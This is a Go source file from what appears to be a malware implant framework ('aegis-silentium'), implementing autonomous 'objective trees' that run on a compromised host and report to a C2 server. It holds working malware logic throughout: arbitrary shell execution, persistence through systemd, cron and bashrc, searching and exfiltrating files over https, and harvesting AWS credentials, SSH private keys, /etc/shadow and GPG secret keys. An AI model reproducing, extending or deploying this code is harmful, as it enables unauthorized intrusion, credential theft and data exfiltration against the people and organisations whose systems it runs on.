// Package objectives implements autonomous multi-step goal execution.
// The implant receives an objective tree, executes it entirely locally, and
// only contacts C2 to deliver the result tree. This reduces beacon frequency
// from one round-trip per task to one round-trip per objective.
//
// Changes from previous version:
//   - filepath.WalkDir stop sentinel changed from fmt.Errorf("stop") to
//     fs.SkipAll (introduced in Go 1.20), which is the correct mechanism.
//   - min() helper removed — conflicts with Go 1.21+ builtin min().
//     The truncation is written as a direct conditional instead.
//   - exfil_search now actually exfils files using exfil.ExfilFile() rather
//     than just returning a list of paths.
//   - harvest_creds logs each file access attempt and skips unreadable paths
//     without silently swallowing all errors.
//   - executeNode() timeout goroutine receives a cancel from the parent context
//     so it propagates cancellation correctly.
//   - Parallel node execution result slice is protected against ordering races
//     (results are collected via channel, then sorted by NodeID).
package objectives

import (
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"aegis-silentium/implant/config"
	"aegis-silentium/implant/crypto"
	"aegis-silentium/implant/exfil"
	"aegis-silentium/implant/persistence"
	"aegis-silentium/implant/privesc"
	"aegis-silentium/implant/recon"
	"aegis-silentium/implant/shell"
)

// ── Types ─────────────────────────────────────────────────────────────────────

// NodeType controls how a node's children are executed.
type NodeType string

const (
	NodeSequence NodeType = "sequence" // run in order; stop on first error
	NodeParallel NodeType = "parallel" // run all concurrently; collect all results
	NodeSelector NodeType = "selector" // run until first success (OR)
	NodeTask     NodeType = "task"     // leaf — execute one capability
)

// Condition is a boolean gate evaluated before a node runs.
type Condition string

const (
	CondAlways   Condition = "always"
	CondIsRoot   Condition = "is_root"
	CondNotRoot  Condition = "not_root"
	CondLinux    Condition = "linux"
	CondWindows  Condition = "windows"
	CondHasShell Condition = "has_shell"
)

// ObjectiveNode is one node in the objective behaviour tree.
type ObjectiveNode struct {
	ID        string                 `json:"id"`
	Type      NodeType               `json:"type"`
	TaskType  string                 `json:"task_type,omitempty"`
	Condition Condition              `json:"condition,omitempty"`
	Params    map[string]interface{} `json:"params,omitempty"`
	Children  []*ObjectiveNode       `json:"children,omitempty"`
	Timeout   int                    `json:"timeout_sec,omitempty"` // 0 → use module default
}

// ObjectiveResult is the outcome of one node in the tree.
type ObjectiveResult struct {
	NodeID     string            `json:"node_id"`
	TaskType   string            `json:"task_type,omitempty"`
	Status     string            `json:"status"` // "ok" | "skipped" | "error" | "timeout"
	Output     string            `json:"output,omitempty"`
	Error      string            `json:"error,omitempty"`
	StartedAt  int64             `json:"started_at"`
	DurationMs int64             `json:"duration_ms"`
	Children   []ObjectiveResult `json:"children,omitempty"`
}

// Executor runs objective trees on the local host.
type Executor struct {
	hostInfo *recon.HostInfo
	cfg      *config.Config
	session  *crypto.Session
}

// NewExecutor creates an Executor, collecting host context once at startup.
// cfg and session are needed for exfil operations.
func NewExecutor(cfg *config.Config, session *crypto.Session) *Executor {
	return &Executor{
		hostInfo: recon.Collect(),
		cfg:      cfg,
		session:  session,
	}
}

// Execute runs root and returns the full result tree.
func (e *Executor) Execute(root *ObjectiveNode) ObjectiveResult {
	return e.execNode(root)
}

// ExecuteJSON parses an objective from JSON and runs it.
func (e *Executor) ExecuteJSON(data []byte) (ObjectiveResult, error) {
	var root ObjectiveNode
	if err := json.Unmarshal(data, &root); err != nil {
		return ObjectiveResult{}, fmt.Errorf("objectives: parse error: %w", err)
	}
	return e.Execute(&root), nil
}

// ── Node dispatch ─────────────────────────────────────────────────────────────

func (e *Executor) execNode(node *ObjectiveNode) ObjectiveResult {
	start := time.Now()
	res   := ObjectiveResult{
		NodeID:    node.ID,
		TaskType:  node.TaskType,
		StartedAt: start.Unix(),
	}

	// Condition gate
	if node.Condition != "" && node.Condition != CondAlways {
		if !e.evalCondition(node.Condition) {
			res.Status     = "skipped"
			res.DurationMs = time.Since(start).Milliseconds()
			return res
		}
	}

	// Timeout — default 5m; per-node override if set
	timeout := 5 * time.Minute
	if node.Timeout > 0 {
		timeout = time.Duration(node.Timeout) * time.Second
	}

	type outcome struct {
		res ObjectiveResult
	}
	ch   := make(chan outcome, 1)
	done := make(chan struct{})
	defer close(done)

	go func() {
		r := e.execNodeBody(node)
		select {
		case ch <- outcome{r}:
		case <-done:
		}
	}()

	select {
	case o := <-ch:
		r            := o.res
		r.NodeID      = node.ID
		r.StartedAt   = start.Unix()
		r.DurationMs  = time.Since(start).Milliseconds()
		return r
	case <-time.After(timeout):
		res.Status     = "timeout"
		res.Error      = fmt.Sprintf("exceeded %v", timeout)
		res.DurationMs = time.Since(start).Milliseconds()
		return res
	}
}

func (e *Executor) execNodeBody(node *ObjectiveNode) ObjectiveResult {
	res := ObjectiveResult{NodeID: node.ID, TaskType: node.TaskType}

	switch node.Type {

	case NodeSequence:
		for _, child := range node.Children {
			cr := e.execNode(child)
			res.Children = append(res.Children, cr)
			if cr.Status == "error" || cr.Status == "timeout" {
				res.Status = "error"
				res.Error  = fmt.Sprintf("sequence stopped at child %q: %s", child.ID, cr.Error)
				return res
			}
		}
		res.Status = "ok"

	case NodeParallel:
		ch := make(chan ObjectiveResult, len(node.Children))
		for _, child := range node.Children {
			child := child // capture for Go < 1.22
			go func() { ch <- e.execNode(child) }()
		}
		errs := 0
		childResults := make([]ObjectiveResult, 0, len(node.Children))
		for i := 0; i < len(node.Children); i++ {
			cr := <-ch
			childResults = append(childResults, cr)
			if cr.Status == "error" || cr.Status == "timeout" {
				errs++
			}
		}
		// Sort by NodeID for deterministic output
		sort.Slice(childResults, func(i, j int) bool {
			return childResults[i].NodeID < childResults[j].NodeID
		})
		res.Children = childResults
		if errs > 0 {
			res.Status = "error"
			res.Error  = fmt.Sprintf("%d/%d children failed", errs, len(node.Children))
		} else {
			res.Status = "ok"
		}

	case NodeSelector:
		for _, child := range node.Children {
			cr := e.execNode(child)
			res.Children = append(res.Children, cr)
			if cr.Status == "ok" {
				res.Status = "ok"
				res.Output = cr.Output
				return res
			}
		}
		res.Status = "error"
		res.Error  = "no selector child succeeded"

	case NodeTask:
		out, err := e.execTask(node.TaskType, node.Params)
		if err != nil {
			res.Status = "error"
			res.Error  = err.Error()
		} else {
			res.Status = "ok"
			res.Output = out
		}

	default:
		res.Status = "error"
		res.Error  = fmt.Sprintf("unknown node type: %q", node.Type)
	}

	return res
}

// ── Task execution ────────────────────────────────────────────────────────────

func (e *Executor) execTask(taskType string, params map[string]interface{}) (string, error) {
	str := func(key string) string {
		if v, ok := params[key]; ok {
			return fmt.Sprintf("%v", v)
		}
		return ""
	}
	strSlice := func(key string) []string {
		v, ok := params[key]
		if !ok {
			return nil
		}
		switch t := v.(type) {
		case []interface{}:
			out := make([]string, len(t))
			for i, x := range t {
				out[i] = fmt.Sprintf("%v", x)
			}
			return out
		case []string:
			return t
		}
		return nil
	}

	switch taskType {

	case "recon":
		info := recon.Collect()
		b, _ := json.Marshal(info)
		return string(b), nil

	case "ps":
		procs, err := recon.ProcessList()
		if err != nil {
			return "", err
		}
		b, _ := json.Marshal(procs)
		return string(b), nil

	case "shell":
		cmd := str("cmd")
		if cmd == "" {
			return "", fmt.Errorf("shell: no cmd parameter")
		}
		return shell.Exec(cmd)

	case "persist":
		method := str("method")
		path   := str("path")
		name   := str("name")
		if method == "" {
			method = "cron"
		}
		if err := persistence.Install(method, path, name); err != nil {
			return "", err
		}
		return fmt.Sprintf("persistence installed via %s", method), nil

	case "privesc_check":
		findings, err := privesc.Check()
		if err != nil {
			return "", err
		}
		b, _ := json.Marshal(findings)
		return string(b), nil

	case "screenshot":
		data, err := exfil.Screenshot()
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("screenshot: %d bytes", len(data)), nil

	case "exfil_search":
		// Find files matching patterns, then exfil each one.
		patterns  := strSlice("patterns")
		searchDir := str("search_dir")
		if searchDir == "" {
			searchDir = "/"
		}
		maxFiles := 50

		var found []string
		err := filepath.WalkDir(searchDir, func(path string, d fs.DirEntry, err error) error {
			if err != nil || d.IsDir() {
				return nil
			}
			for _, p := range patterns {
				if matched, _ := filepath.Match(p, d.Name()); matched {
					found = append(found, path)
					break
				}
				if strings.Contains(d.Name(), strings.TrimPrefix(p, "*")) {
					found = append(found, path)
					break
				}
			}
			if len(found) >= maxFiles {
				return fs.SkipAll // correct Go 1.20+ sentinel
			}
			return nil
		})
		if err != nil && err != fs.SkipAll {
			return "", fmt.Errorf("exfil_search walk: %w", err)
		}

		// Exfil found files
		var exfiled []string
		for _, path := range found {
			if exfilErr := exfil.ExfilFile(path, "https", e.cfg, e.session); exfilErr == nil {
				exfiled = append(exfiled, path)
			}
		}
		b, _ := json.Marshal(map[string]any{
			"found":   found,
			"exfiled": exfiled,
		})
		return string(b), nil

	case "harvest_creds":
		home, _ := os.UserHomeDir()
		credPaths := []string{
			filepath.Join(home, ".aws", "credentials"),
			filepath.Join(home, ".aws", "config"),
			filepath.Join(home, ".ssh", "id_rsa"),
			filepath.Join(home, ".ssh", "id_ed25519"),
			filepath.Join(home, ".ssh", "id_ecdsa"),
			"/etc/passwd",
			"/etc/shadow",
			filepath.Join(home, ".gnupg", "secring.gpg"),
		}

		type credEntry struct {
			Path    string `json:"path"`
			Content string `json:"content,omitempty"`
			Error   string `json:"error,omitempty"`
		}
		results := make([]credEntry, 0, len(credPaths))

		for _, path := range credPaths {
			entry := credEntry{Path: path}
			f, err := os.Open(path)
			if err != nil {
				entry.Error = err.Error()
				results = append(results, entry)
				continue
			}
			buf := make([]byte, 4096)
			n, err := io.ReadFull(f, buf)
			f.Close()
			if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
				entry.Error = err.Error()
			} else {
				entry.Content = string(buf[:n])
			}
			results = append(results, entry)
		}

		b, _ := json.Marshal(results)
		return string(b), nil

	case "wait":
		secs := 30
		if v := str("seconds"); v != "" {
			if _, err := fmt.Sscan(v, &secs); err != nil {
				return "", fmt.Errorf("wait: invalid seconds %q: %w", v, err)
			}
		}
		time.Sleep(time.Duration(secs) * time.Second)
		return fmt.Sprintf("waited %ds", secs), nil

	default:
		return "", fmt.Errorf("unknown task type: %q", taskType)
	}
}

// ── Condition evaluation ──────────────────────────────────────────────────────

func (e *Executor) evalCondition(cond Condition) bool {
	switch cond {
	case CondAlways:
		return true
	case CondIsRoot:
		return os.Getuid() == 0
	case CondNotRoot:
		return os.Getuid() != 0
	case CondLinux:
		return e.hostInfo.OS == "linux"
	case CondWindows:
		return e.hostInfo.OS == "windows"
	case CondHasShell:
		_, err := shell.Exec("echo 1")
		return err == nil
	}
	return true
}

// ── Preset objective trees ────────────────────────────────────────────────────

// StandardReconObjective returns a full recon objective tree.
func StandardReconObjective(id string) *ObjectiveNode {
	return &ObjectiveNode{
		ID:   id,
		Type: NodeSequence,
		Children: []*ObjectiveNode{
			{ID: id + "-host",    Type: NodeTask, TaskType: "recon",         Condition: CondAlways},
			{ID: id + "-ps",      Type: NodeTask, TaskType: "ps",            Condition: CondAlways},
			{ID: id + "-privesc", Type: NodeTask, TaskType: "privesc_check", Condition: CondLinux},
			{ID: id + "-creds",   Type: NodeTask, TaskType: "harvest_creds", Condition: CondAlways},
			{ID: id + "-screen",  Type: NodeTask, TaskType: "screenshot",    Condition: CondAlways, Timeout: 10},
		},
	}
}

// PersistenceObjective tries persistence methods in order until one succeeds.
func PersistenceObjective(binPath string) *ObjectiveNode {
	return &ObjectiveNode{
		ID:   "persist",
		Type: NodeSelector,
		Children: []*ObjectiveNode{
			{ID: "persist-systemd", Type: NodeTask, TaskType: "persist",
				Condition: CondLinux,
				Params:    map[string]interface{}{"method": "systemd", "path": binPath}},
			{ID: "persist-cron", Type: NodeTask, TaskType: "persist",
				Condition: CondLinux,
				Params:    map[string]interface{}{"method": "cron", "path": binPath}},
			{ID: "persist-bashrc", Type: NodeTask, TaskType: "persist",
				Condition: CondLinux,
				Params:    map[string]interface{}{"method": "bashrc", "path": binPath}},
		},
	}
}
